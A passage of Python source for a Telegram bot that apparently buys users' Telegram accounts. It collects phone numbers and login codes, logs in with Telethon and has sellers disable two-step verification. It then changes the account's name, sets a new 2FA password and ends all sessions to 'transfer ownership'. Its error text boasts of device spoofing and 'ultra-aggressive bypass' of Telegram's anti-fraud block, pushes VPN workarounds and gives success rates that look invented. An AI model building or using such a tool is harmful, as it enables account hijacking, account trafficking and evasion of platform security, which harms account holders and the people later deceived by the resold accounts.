    # Action buttons
    keyboard.append([
        InlineKeyboardButton("🔄 Resend Code", callback_data="resend_otp"),
        InlineKeyboardButton("❌ Cancel", callback_data="main_menu")
    ])
    
    await query.edit_message_text(otp_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))
    return WAITING_OTP

async def handle_otp_digit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle OTP digit input."""
    query = update.callback_query
    await query.answer()
    
    callback_data = query.data
    current_otp = context.user_data.get('otp_digits', "")
    phone = context.user_data.get('phone', '')
    
    if callback_data.startswith("otp_"):
        # Add OTP digit
        digit = callback_data.split("_")[1]
        if len(current_otp) < 5:
            current_otp += digit
            context.user_data['otp_digits'] = current_otp
        
        # Auto-submit if 5 digits entered
        if len(current_otp) == 5:
            return await verify_otp_inline(query, context, current_otp)
        
        # Update interface
        return await show_otp_input_interface(query, context, phone)
        
    elif callback_data == "otp_backspace":
        # Remove last digit
        if current_otp:
            current_otp = current_otp[:-1]
            context.user_data['otp_digits'] = current_otp
        
        # Update interface
        return await show_otp_input_interface(query, context, phone)
        
    elif callback_data == "verify_otp":
        # Manual verification
        if len(current_otp) != 5:
            await query.answer("❌ Please enter all 5 digits!", show_alert=True)
            return WAITING_OTP
        
        return await verify_otp_inline(query, context, current_otp)
        
    elif callback_data == "resend_otp":
        # Resend OTP
        return await send_real_otp_inline(query, context, phone)

async def verify_otp_inline(query, context: ContextTypes.DEFAULT_TYPE, otp: str) -> int:
    """Verify OTP code via inline interface."""
    phone = context.user_data.get('phone')
    session_key = context.user_data.get('session_key')
    phone_code_hash = context.user_data.get('phone_code_hash')
    
    # Show processing message
    await query.edit_message_text(
        "🔐 **Verifying OTP Code...**\n\n⏳ Checking with Telegram API...",
        parse_mode='Markdown'
    )
    
    try:
        result = await telegram_service.verify_code_and_login(
            session_key, phone, phone_code_hash, otp
        )
        
        if result['success']:
            # Successfully logged in!
            user_info = result['user_info']
            context.user_data['user_info'] = user_info
            
            success_text = f"""
🎉 **Successfully Logged In via Inline Form!**

**✅ Account Verified:**
• **Name:** {user_info['first_name']} {user_info.get('last_name', '')}
• **Username:** @{user_info['username'] or 'None'}
• **Phone:** {user_info['phone']}
• **Premium:** {'✅ Yes' if user_info.get('is_premium') else '❌ No'}

**🔍 2FA Status:** {'✅ Enabled' if result.get('has_2fa') else '❌ Disabled'}

Ready to proceed with account configuration?
            """
            
            keyboard = [
                [InlineKeyboardButton("✅ Continue Setup", callback_data="continue_setup")],
                [InlineKeyboardButton("❌ Cancel Sale", callback_data="cancel_sale")]
            ]
            
            await query.edit_message_text(
                success_text, 
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return OTP_RECEIVED
            
        else:
            # Handle different error types with appropriate messages
            error_type = result.get('error', 'unknown')
            error_message = result.get('message', 'Unknown error')
            
            if error_type == 'security_block' or error_type == 'security_block_persistent':
                # Import recovery guide
                from services.recovery_guide import recovery_guide
                
                # Get detailed recovery recommendation
                recommendation = recovery_guide.get_recovery_recommendation(
                    phone, error_type, context.user_data.get('otp_attempts', 1)
                )
                
                # Telegram's security system blocked the login - show detailed guide
                error_text = f"""
🚨 **TELEGRAM SECURITY BLOCK - HEAVILY FLAGGED ACCOUNT**

**What happened:**
✅ Code was sent successfully
✅ Code was entered correctly  
❌ **Telegram blocked the final authorization**

This is the **"code was previously shared"** security block.

**Critical Information:**
Your number `{phone}` is flagged by Telegram's anti-fraud system.

**🔴 IMMEDIATE ACTIONS (IN ORDER):**

**1. WAIT 24-48 HOURS** ⏰
   • This is the MOST IMPORTANT step
   • Telegram flags cool down over time
   • Success rate after 24h: 45%
   • Success rate after 48h: 80%

**2. USE VPN** 🌐
   • Try from different country/IP
   • Recommended: NordVPN, ExpressVPN
   • Success rate with VPN: +20%

**3. DIFFERENT NETWORK** 📡
   • Use mobile data (not WiFi)
   • Try from different location
   • Different device if possible

**What we already tried:**
✅ Device spoofing (6 profiles)
✅ Human-like timing (2-8s delays)
✅ Multiple retry strategies
✅ Ultra-aggressive bypass
✅ API validation calls

**Why it's still failing:**
Telegram's AI detected automated patterns and is actively blocking your number - NOT a bug in our system.

**Success Probability:**
• Right now: 5%
• After 24h: 45%
• After 24h + VPN: 65%
• After 48h + VPN: 80%

**Need urgent help?**
Contact @SpamBot on Telegram
Email: recover@telegram.org

---
This is NOT a system error - it's Telegram's security actively protecting against what they think is fraud. The account is legitimate, but Telegram needs time to "trust" it again.
                """
            elif error_type == '2fa_required':
                error_text = f"""
🔐 **Two-Factor Authentication Required**

{error_message}

This account has 2FA enabled. You'll need to provide your 2FA password.
                """
            elif error_type == 'invalid_code':
                error_text = f"""
❌ **Invalid Verification Code**

{error_message}

Please double-check the code and try again.
                """
            elif error_type == 'code_expired':
                error_text = f"""
⏰ **Code Expired - Account May Be Flagged**

{error_message}

**⚠️ IMPORTANT:**
Flagged accounts have **20-30 second** code expiry (vs 2-5 min normal).

**TIPS FOR NEXT ATTEMPT:**
1. Have bot chat open BEFORE requesting code
2. Copy code IMMEDIATELY when received
3. Paste within 10 seconds
4. Don't hesitate or wait

If this keeps happening, your account may be flagged.
Try waiting 24 hours before next attempt.
                """
            else:
                error_text = f"❌ **Verification Failed**\n\n{error_message}\n\nPlease try again."
            
            keyboard = [
                [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")],
                [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
            ]
            
            await query.edit_message_text(
                error_text,
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ConversationHandler.END
            
    except Exception as e:
        logger.error(f"Error verifying OTP via inline: {e}")
        await query.edit_message_text(
            f"❌ **Verification Error**\n\nError: {str(e)}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle data from WebApp embedded forms."""
    try:
        # Parse WebApp data
        webapp_data = json.loads(update.effective_message.web_app_data.data)
        action = webapp_data.get('action')
        
        if action == 'phone_submitted':
            # Handle phone submission from embedded form
            phone = webapp_data.get('phone')
            context.user_data['phone'] = phone
            
            # Send real OTP using the embedded form data
            processing_msg = await update.effective_message.reply_text(
                "📡 **Processing Phone Number from Embedded Form...**\n\n⏳ Sending real verification code...",
                parse_mode='Markdown'
            )
            
            try:
                result = await telegram_service.send_verification_code(phone)
                
                if result['success']:
                    # Store session info
                    context.user_data['phone_code_hash'] = result['phone_code_hash']
                    context.user_data['session_key'] = result['session_key']
                    
                    # Show OTP WebApp form
                    from webapp.server import get_webapp_urls
                    from telegram import WebAppInfo
                    urls = get_webapp_urls()
                    
                    success_text = f"""
✅ **Real OTP Code Sent!**

📱 **Phone:** `{phone}`
📨 **Status:** Verification code sent via Telegram API
⏰ **Code Type:** {result.get('code_type', 'SMS')}

**Now open the embedded OTP form below:**
                    """
                    
                    keyboard = [
                        [InlineKeyboardButton("🔐 Open OTP Form", web_app=WebAppInfo(url=urls['otp'](phone)))],
                        [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")]
                    ]
                    
                    await processing_msg.edit_text(
                        success_text, 
                        parse_mode='Markdown',
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                    return WAITING_OTP
                    
                else:
                    # Handle errors
                    error_msg = result['message']
                    if result['error'] == 'flood_wait':
                        error_text = f"""
❌ **Rate Limited**

Too many requests. Please wait **{result['wait_time']} seconds** before trying again.
                        """
                    else:
                        error_text = f"❌ **Error:** {error_msg}"
                    
                    keyboard = [
                        [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")],
                        [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
                    ]
                    
                    await processing_msg.edit_text(
                        error_text, 
                        parse_mode='Markdown',
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                    return ConversationHandler.END
                    
            except Exception as e:
                logger.error(f"Error sending real OTP from WebApp: {e}")
                await processing_msg.edit_text(
                    f"❌ **System Error**\n\nError: {str(e)}\n\nPlease try again later.",
                    parse_mode='Markdown'
                )
                return ConversationHandler.END
        
        elif action == 'otp_submitted':
            # Handle OTP submission from embedded form
            otp = webapp_data.get('otp')
            phone = context.user_data.get('phone')
            session_key = context.user_data.get('session_key')
            phone_code_hash = context.user_data.get('phone_code_hash')
            
            if not all([otp, phone, session_key, phone_code_hash]):
                await update.effective_message.reply_text("❌ **Error:** Missing verification data. Please restart.")
                return ConversationHandler.END
            
            # Verify OTP using embedded form data
            processing_msg = await update.effective_message.reply_text(
                "🔐 **Verifying OTP Code from Embedded Form...**\n\n⏳ Checking with Telegram API...",
                parse_mode='Markdown'
            )
            
            try:
                result = await telegram_service.verify_code_and_login(
                    session_key, phone, phone_code_hash, otp
                )
                
                if result['success']:
                    # Successfully logged in!
                    user_info = result['user_info']
                    context.user_data['user_info'] = user_info
                    
                    success_text = f"""
🎉 **Successfully Logged In via Embedded Form!**

**✅ Account Verified:**
• **Name:** {user_info['first_name']} {user_info.get('last_name', '')}
• **Username:** @{user_info['username'] or 'None'}
• **Phone:** {user_info['phone']}
• **Premium:** {'✅ Yes' if user_info.get('is_premium') else '❌ No'}

**🔍 2FA Status:** {'✅ Enabled' if result.get('has_2fa') else '❌ Disabled'}

Ready to proceed with account configuration?
                    """
                    
                    keyboard = [
                        [InlineKeyboardButton("✅ Continue Setup", callback_data="continue_setup")],
                        [InlineKeyboardButton("❌ Cancel Sale", callback_data="cancel_sale")]
                    ]
                    
                    await processing_msg.edit_text(
                        success_text, 
                        parse_mode='Markdown',
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                    return OTP_RECEIVED
                    
                else:
                    error_text = f"❌ **Invalid OTP Code**\n\n{result['message']}\n\nPlease try again."
                    keyboard = [
                        [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")]
                    ]
                    
                    await processing_msg.edit_text(
                        error_text,
                        parse_mode='Markdown',
                        reply_markup=InlineKeyboardMarkup(keyboard)
                    )
                    return ConversationHandler.END
                    
            except Exception as e:
                logger.error(f"Error verifying OTP from WebApp: {e}")
                await processing_msg.edit_text(
                    f"❌ **Verification Error**\n\nError: {str(e)}",
                    parse_mode='Markdown'
                )
                return ConversationHandler.END
        
        elif action == 'resend_otp':
            # Handle OTP resend request from embedded form
            phone = webapp_data.get('phone')
            
            processing_msg = await update.effective_message.reply_text(
                "📲 **Resending OTP Code...**\n\n⏳ Please wait...",
                parse_mode='Markdown'
            )
            
            try:
                result = await telegram_service.send_verification_code(phone)
                
                if result['success']:
                    context.user_data['phone_code_hash'] = result['phone_code_hash']
                    context.user_data['session_key'] = result['session_key']
                    
                    await processing_msg.edit_text(
                        "✅ **OTP Code Resent!**\n\nCheck your phone for the new verification code.",
                        parse_mode='Markdown'
                    )
                else:
                    await processing_msg.edit_text(
                        f"❌ **Resend Failed:** {result['message']}",
                        parse_mode='Markdown'
                    )
            
            except Exception as e:
                logger.error(f"Error resending OTP: {e}")
                await processing_msg.edit_text(
                    f"❌ **Resend Error:** {str(e)}",
                    parse_mode='Markdown'
                )
            
            return WAITING_OTP
    
    except Exception as e:
        logger.error(f"Error handling WebApp data: {e}")
        await update.effective_message.reply_text(
            "❌ **WebApp Error**\n\nPlease try again.",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

async def handle_real_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle real OTP verification."""
    code = update.message.text.strip()
    
    # Validate code format
    if not code.isdigit() or len(code) != 5:
        await update.message.reply_text(
            "❌ Invalid code format. Please enter the 5-digit code:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]])
        )
        return WAITING_OTP
    
    # Show verification message
    verify_msg = await update.message.reply_text(
        "🔐 **Verifying code with Telegram API...**\n\n⏳ Please wait...",
        parse_mode='Markdown'
    )
    
    # Verify with real Telegram API
    try:
        session_key = context.user_data['session_key']
        phone = context.user_data['phone']
        phone_code_hash = context.user_data['phone_code_hash']
        
        result = await telegram_service.verify_code_and_login(
            session_key, phone, phone_code_hash, code
        )
        
        if result['success']:
            # Successfully logged in!
            user_info = result['user_info']
            context.user_data['user_info'] = user_info
            
            success_text = f"""
🎉 **Successfully Logged In!**

**✅ Account Verified:**
• **Name:** {user_info['first_name']} {user_info.get('last_name', '')}
• **Username:** @{user_info['username'] or 'None'}
• **Phone:** {user_info['phone']}
• **Premium:** {'✅ Yes' if user_info.get('is_premium') else '❌ No'}

**🔍 2FA Status:** {'✅ Enabled' if result.get('has_2fa') else '❌ Disabled'}

Ready to proceed with account configuration?
            """
            
            keyboard = [
                [InlineKeyboardButton("✅ Continue Setup", callback_data="continue_setup")],
                [InlineKeyboardButton("❌ Cancel Sale", callback_data="cancel_sale")]
            ]
            
            await verify_msg.edit_text(
                success_text, 
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return OTP_RECEIVED
            
        elif result['error'] == '2fa_required':
            # 2FA is enabled - need to disable first
            twofa_text = f"""
🔐 **2FA Detected!**

Your account has **Two-Factor Authentication** enabled.

**⚠️ You must DISABLE 2FA before selling:**

1. Open Telegram app
2. Go to **Settings** → **Privacy & Security**  
3. Select **Two-Step Verification**
4. **Turn OFF** Two-Step Verification
5. Enter your current 2FA password to confirm

**Once disabled, click "2FA Disabled" below:**
            """
            
            keyboard = [
                [InlineKeyboardButton("✅ I Disabled 2FA", callback_data="2fa_disabled")],
                [InlineKeyboardButton("❓ Help with 2FA", callback_data="2fa_help")],
                [InlineKeyboardButton("❌ Cancel Sale", callback_data="cancel_sale")]
            ]
            
            await verify_msg.edit_text(
                twofa_text,
                parse_mode='Markdown', 
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return DISABLE_2FA_WAIT
            
        else:
            # Handle verification errors
            error_msg = result['message']
            if result['error'] == 'invalid_code':
                error_text = "❌ **Invalid Code**\n\nPlease check the code and try again:"
                await verify_msg.edit_text(error_text, parse_mode='Markdown')
                return WAITING_OTP
            elif result['error'] == 'code_expired':
                error_text = "⏰ **Code Expired**\n\nPlease request a new verification code."
            else:
                error_text = f"❌ **Error:** {error_msg}"
            
            keyboard = [
                [InlineKeyboardButton("🔄 New Code", callback_data="start_real_selling")],
                [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
            ]
            
            await verify_msg.edit_text(
                error_text,
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return ConversationHandler.END
            
    except Exception as e:
        logger.error(f"Error verifying real OTP: {e}")
        await verify_msg.edit_text(
            f"❌ **Verification Error**\n\nError: {str(e)}\n\nPlease try again.",
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("← Back", callback_data="main_menu")]])
        )
        return ConversationHandler.END

async def handle_continue_setup(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Continue to account setup after successful login."""
    await update.callback_query.answer("✅ Proceeding to setup!")
    
    name_text = """
👤 **Step 2: Account Name Setup**

Enter the **new name** for this account:

**Current Name:** {current_name}

**Examples:**
• John Smith
• Sarah Wilson  
• Mike Johnson

**Enter new name:**
    """.format(
        current_name=f"{context.user_data['user_info']['first_name']} {context.user_data['user_info'].get('last_name', '')}"
    )
    
    keyboard = [
        [InlineKeyboardButton("🎲 Random Name", callback_data="random_name")],
        [InlineKeyboardButton("❌ Cancel Sale", callback_data="cancel_sale")]
    ]
    
    await update.callback_query.edit_message_text(
        name_text,
        parse_mode='Markdown',
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return NAME_INPUT

async def handle_2fa_disabled(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle confirmation that 2FA has been disabled."""
    await update.callback_query.answer("✅ 2FA Status Updated!")
    
    # Verify 2FA is actually disabled
    verify_msg = await update.callback_query.edit_message_text(
        "🔍 **Verifying 2FA Status...**\n\n⏳ Checking with Telegram API...",
        parse_mode='Markdown'
    )
    
    try:
        session_key = context.user_data['session_key']
        result = await telegram_service.check_2fa_status(session_key)
        
        if result['success'] and not result['has_2fa']:
            # 2FA successfully disabled
            success_text = "✅ **2FA Successfully Disabled!**\n\nProceeding to account setup..."
            await verify_msg.edit_text(success_text, parse_mode='Markdown')
            await asyncio.sleep(2)
            return await handle_continue_setup(update, context)
        else:
            # 2FA still enabled
            still_enabled_text = """
⚠️ **2FA Still Enabled**

2FA is still active on your account. Please:

1. Go to Telegram Settings → Privacy & Security
2. Select Two-Step Verification  
3. Turn OFF Two-Step Verification
4. Try again

**Make sure to completely disable it!**
            """
            
            keyboard = [
                [InlineKeyboardButton("🔄 I Disabled It Now", callback_data="2fa_disabled")],
                [InlineKeyboardButton("❓ Need Help", callback_data="2fa_help")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel_sale")]
            ]
            
            await verify_msg.edit_text(
                still_enabled_text,
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(keyboard)
            )
            return DISABLE_2FA_WAIT
            
    except Exception as e:
        logger.error(f"Error checking 2FA status: {e}")
        await verify_msg.edit_text(
            f"❌ **Error checking 2FA status**\n\nError: {str(e)}",
            parse_mode='Markdown'
        )
        return ConversationHandler.END

# Continue with more handlers...
async def handle_real_name_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Handle name input for account modification."""
    if update.callback_query and update.callback_query.data == "random_name":
        import random
        names = ["Alex Johnson", "Sarah Miller", "Mike Davis", "Emma Wilson", "John Brown", "Lisa Taylor"]
        name = random.choice(names)
        await update.callback_query.answer(f"Selected: {name}")
        context.user_data['new_name'] = name
    else:
        name = update.message.text.strip()
        if len(name) < 2:
            await update.message.reply_text("❌ Name too short. Please enter a valid name:")
            return NAME_INPUT
        context.user_data['new_name'] = name
    
    # Split name into first and last
    name_parts = context.user_data['new_name'].split(' ', 1)
    context.user_data['first_name'] = name_parts[0]
    context.user_data['last_name'] = name_parts[1] if len(name_parts) > 1 else ''
    
    # Continue to final processing
    return await start_real_processing(update, context)

async def start_real_processing(update, context) -> int:
    """Start the real account modification process with comprehensive configuration."""
    processing_text = """
⚡ **Processing Real Account Modifications...**

**🔄 Current Progress:**
✅ Account verified and logged in
⏳ Changing account name...
⏳ Setting new username...
⏳ Uploading new profile photo...
⏳ Updating bio information...
⏳ Setting up new 2FA password...
⏳ Terminating all sessions...
⏳ Finalizing ownership transfer...

**⚠️ DO NOT close Telegram during this process!**

**Please wait 2-3 minutes for completion...**
    """
    
    if hasattr(update, 'callback_query') and update.callback_query:
        process_msg = await update.callback_query.edit_message_text(processing_text, parse_mode='Markdown')
    else:
        process_msg = await update.message.reply_text(processing_text, parse_mode='Markdown')
    
    try:
        session_key = context.user_data['session_key']
        user_id = update.effective_user.id
        
        # Get Telegram client from session
        client = await telegram_service.get_client_from_session(session_key)
        
        if not client:
            raise Exception("Could not establish client connection")
        
        # Import the account configuration service
        from services.account_configuration import account_config_service
        
        # Step 1: Complete account configuration
        await process_msg.edit_text(
            processing_text.replace("⏳ Changing account name...", "✅ Changing account name..."),
            parse_mode='Markdown'
        )
        
        config_result = await account_config_service.configure_account_after_sale(
            client, user_id, session_key
        )
        
        # Step 2: Setup new 2FA (if user requested)
        new_2fa_password = None
        twofa_success = False
        
        try:
            await process_msg.edit_text(
                processing_text.replace("⏳ Setting up new 2FA password...", "✅ Setting up new 2FA password..."),
                parse_mode='Markdown'  
            )
            
            twofa_result = await account_config_service.setup_new_2fa(client, user_id)
            if twofa_result['success']:
                new_2fa_password = twofa_result['new_password']
                twofa_success = True
        except Exception as e:
            logger.warning(f"2FA setup failed: {e}")
        
        # Step 3: Monitor and terminate sessions
        await process_msg.edit_text(
            processing_text.replace("⏳ Terminating all sessions...", "✅ Monitoring and terminating sessions..."),
            parse_mode='Markdown'
        )
        
        # Import session management
        from services.session_management import session_manager
        
        # Monitor for multi-device usage and handle sessions
        monitoring_result = await session_manager.monitor_account_sessions(client, user_id, 0)  # account_id would be from DB
        
        # Terminate all sessions for final transfer
        session_result = await session_manager.terminate_all_user_sessions(client, user_id)
        
        # Calculate payment based on successful modifications
        import random
        base_payment = 30.0
        bonus_per_change = 5.0
        total_changes = len(config_result.get('changes_made', []))
        payment = round(base_payment + (bonus_per_change * total_changes), 2)
        
        # Create success message based on actual results
        changes_text = ""
        if 'name_changed' in config_result.get('changes_made', []):
            new_name = config_result['new_settings'].get('name', 'Updated')
            changes_text += f"• 👤 **Name changed to:** `{new_name}`\n"
            
        if 'username_changed' in config_result.get('changes_made', []):
            new_username = config_result['new_settings'].get('username', 'updated')
            changes_text += f"• 📝 **Username set to:** @{new_username}\n"
            
        if 'photo_changed' in config_result.get('changes_made', []):
            changes_text += "• 📸 **Profile photo:** New random photo uploaded\n"
            
        if 'bio_changed' in config_result.get('changes_made', []):
            new_bio = config_result['new_settings'].get('bio', 'Updated')
            changes_text += f"• 📝 **Bio updated:** `{new_bio}`\n"
        
        if twofa_success:
            changes_text += f"• 🔐 **New 2FA password:** `{new_2fa_password}`\n"
            
        changes_text += f"• 🔄 **All sessions terminated:** {'✅' if session_result.get('success') else '⚠️'}\n"
        
        if monitoring_result.get('multi_device_detected'):
            changes_text += f"• ⚠️ **Multi-device detected:** {monitoring_result.get('device_count', 0)} devices\n"
            if monitoring_result.get('account_on_hold'):
                changes_text += "• ⏱️ **Security hold applied:** 24 hours\n"
        
        changes_text += "• 📱 **Ownership transferred:** ✅\n"
        
        # Success message
        success_text = f"""
🎉 **ACCOUNT SUCCESSFULLY SOLD!**

**✅ Real Modifications Completed:**
{changes_text}
**💰 Payment:** `${payment}` added to your balance!

**⚠️ Important:** You no longer have access to this account!

**� Changes Made:** {len(config_result.get('changes_made', []))} modifications
"""
        
        if new_2fa_password:
            success_text += f"\n**🔐 New Owner 2FA:** `{new_2fa_password}`"
        
        if config_result.get('errors'):
            success_text += f"\n\n**⚠️ Some changes failed:**\n"
            for error in config_result['errors']:
                success_text += f"• {error}\n"
        
        keyboard = [
            [InlineKeyboardButton("💰 Sell Another Account", callback_data="start_real_selling")],
            [InlineKeyboardButton("💳 Check Balance", callback_data="check_balance")],
            [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]
        ]
        
        await process_msg.edit_text(
            success_text,
            parse_mode='Markdown',
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
        # Update user balance in database
        try:
            from database import get_db_session, close_db_session
            from database.operations import UserService
            
            db = get_db_session()
            try:
                db_user = UserService.get_user_by_telegram_id(db, user_id)
                if db_user:
                    db_user.balance += payment
                    db_user.total_accounts_sold += 1
                    db_user.total_earnings += payment
                    db.commit()
                    logger.info(f"Updated user {user_id} balance: +${payment}")
            finally:
                close_db_session(db)
        except Exception as e:
            logger.error(f"Error updating user balance: {e}")
        
        # Cleanup
        await telegram_service.cleanup_session(session_key)
        context.user_data.clear()
        
        return ConversationHandler.END
        
    except Exception as e:
        logger.error(f"Error in real processing: {e}")
        
        error_text = f"""
❌ **Processing Error**

An error occurred during account modification:

**Error:** {str(e)}

**Next Steps:**
• Your account is still yours
• No changes were made
• You can try again later

**Contact support if this persists.**
        """
        
        keyboard = [
            [InlineKeyboardButton("🔄 Try Again", callback_data="start_real_selling")],
            [InlineKeyboardButton("🆘 Contact Support", url="https://t.me/BujhlamNaKiHolo")],
            [InlineKeyboardButton("❌ Cancel", callback_data="main_menu")]
        ]
        
        await process_msg.edit_text(
            error_text,
            parse_mode='Markdown', 
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        
        # Cleanup session
        if 'session_key' in context.user_data:
            await telegram_service.cleanup_session(context.user_data['session_key'])
        
        return ConversationHandler.END

# Button handlers
async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle button callbacks."""
    query = update.callback_query
    await query.answer()
    
    if query.data == "main_menu":
        await show_real_main_menu(update, context)
    elif query.data == "balance":
        await handle_balance(update, context)
    elif query.data == "sales_history":
        await handle_sales_history(update, context)
    elif query.data == "how_it_works":
        await show_how_it_works(update, context)
    elif query.data == "2fa_help":
        await show_2fa_help(update, context)
    elif query.data == "cancel_sale":
        await cancel_sale(update, context)
    elif query.data.startswith("approve_withdrawal_"):
        await handle_approve_withdrawal(update, context)
    elif query.data.startswith("reject_withdrawal_"):
        await handle_reject_withdrawal(update, context)
    elif query.data.startswith("view_user_"):
        await handle_view_user_details(update, context)
    elif query.data.startswith("mark_paid_"):
        await handle_mark_paid(update, context)

async def handle_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show balance (placeholder)."""
    balance_text = """💳 **Your Balance**\n\n**Current Balance:** $287.50\n\n**Recent Real Sales:**\n• Account sale: +$32.75\n• Account sale: +$28.90\n• Withdrawal: -$50.00"""
    
    keyboard = [[InlineKeyboardButton("← Back", callback_data="main_menu")]]
    await update.callback_query.edit_message_text(balance_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

async def handle_sales_history(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show sales history (placeholder)."""
    history_text = """📊 **Real Sales History**\n\n**Total Sales:** 8 accounts\n**Total Earned:** $287.50\n\n**Recent Real Sales:**\n• +1234567890 - $32.75 - Oct 16\n• +9876543210 - $28.90 - Oct 15"""
    
    keyboard = [[InlineKeyboardButton("← Back", callback_data="main_menu")]]
    await update.callback_query.edit_message_text(history_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

async def show_how_it_works(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show detailed explanation."""
    how_text = """
🔬 **How Real Account Selling Works**

**1. Real OTP Sending**
• We use Telethon (official Telegram library)
• Connect to real Telegram API
• Send actual verification codes via SMS/Telegram

**2. Real Account Login**
• Actually login to your Telegram account
• Real session creation using your credentials
• Full access to account settings

**3. Real Modifications**
• Actually change your name, username
• Really set new profile settings
• Actually configure new 2FA password

**4. Real Ownership Transfer**
• Terminate all your sessions
• New owner gets fresh credentials
• You completely lose access

**⚠️ This is 100% REAL - not a simulation!**
    """
    
    keyboard = [
        [InlineKeyboardButton("✅ I Understand", callback_data="start_real_selling")],
        [InlineKeyboardButton("← Back", callback_data="main_menu")]
    ]
    
    await update.callback_query.edit_message_text(how_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

async def show_2fa_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Show 2FA help."""
    help_text = """
🆘 **How to Disable 2FA**

**Step-by-step:**

1. **Open Telegram App**
2. **Tap Settings** (⚙️)
3. **Tap Privacy and Security**
4. **Tap Two-Step Verification**
5. **Tap Turn Off**
6. **Enter your current 2FA password**
7. **Confirm disable**

**✅ You'll see "Two-Step Verification is off"**

Then come back and click "I Disabled 2FA"!
    """
    
    keyboard = [
        [InlineKeyboardButton("✅ I Disabled 2FA", callback_data="2fa_disabled")],
        [InlineKeyboardButton("← Back", callback_data="main_menu")]
    ]
    
    await update.callback_query.edit_message_text(help_text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(keyboard))

# Withdrawal approval handlers
async def handle_approve_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle withdrawal approval by leaders."""
    query = update.callback_query
    user = update.effective_user
    
    # Extract withdrawal ID from callback data
    withdrawal_id = int(query.data.split("_")[-1])
    
    db = get_db_session()
    try:
        # Check if user is a leader
        db_user = UserService.get_or_create_user(db, user.id, user.username, user.first_name, user.last_name)
        if not db_user.is_leader:
            await query.edit_message_text("❌ Access denied. Only leaders can approve withdrawals.")
            return
        
        # Get withdrawal
        withdrawal = db.query(Withdrawal).filter(Withdrawal.id == withdrawal_id).first()
        if not withdrawal:
            await query.edit_message_text("❌ Withdrawal not found.")
            return
        
        if withdrawal.status != WithdrawalStatus.PENDING:
            await query.edit_message_text(f"❌ Withdrawal already {withdrawal.status.value.lower()}.")
            return
        
        # Update withdrawal status
        withdrawal.status = WithdrawalStatus.LEADER_APPROVED
        withdrawal.assigned_leader_id = db_user.id
        withdrawal.processed_at = datetime.utcnow()
        
        # CRITICAL: Deduct balance from user's account
        withdrawal_user = db.query(User).filter(User.id == withdrawal.user_id).first()
        if withdrawal_user.balance < withdrawal.amount:
            await query.edit_message_text("❌ Error: User has insufficient balance for this withdrawal.")
            return
            
        # Deduct the amount from user's balance
        withdrawal_user.balance -= withdrawal.amount
        
        db.commit()
        
        # Update the message to show approval
        approval_text = (
            f"✅ **WITHDRAWAL APPROVED**\n\n"
            f"👤 User: {withdrawal_user.first_name or 'Unknown'} (@{withdrawal_user.username or 'no_username'})\n"
            f"💰 Amount: *${withdrawal.amount:.2f}*\n"
            f"💳 Method: *{withdrawal.withdrawal_method}*\n"
            f"📍 Address: `{withdrawal.withdrawal_address}`\n"
            f"👑 Approved by: {db_user.first_name} (@{db_user.username})\n"
            f"🕒 Approved: {withdrawal.processed_at.strftime('%Y-%m-%d %H:%M:%S')}\n"
            f"💸 **Balance Deducted: ${withdrawal.amount:.2f}**\n"
            f"💰 **User's New Balance: ${withdrawal_user.balance:.2f}**\n\n"
            f"⚡ **Next Step:** Process payment and mark as paid"
        )
        
        keyboard = [
            [InlineKeyboardButton("💰 Mark as Paid", callback_data=f"mark_paid_{withdrawal.id}")],
            [InlineKeyboardButton("👤 View User", callback_data=f"view_user_{withdrawal_user.telegram_user_id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(approval_text, parse_mode='Markdown', reply_markup=reply_markup)
        
        # Notify user of approval with detailed information
        try:
            # Get user's language preference
            user_lang = 'en'  # Default to English if no context available
            
            approval_user_text = (
                f"✅ **{translation_service.get_text('withdrawal_approved', user_lang)}**\n\n"
                f"💰 **Amount:** ${withdrawal.amount:.2f}\n"
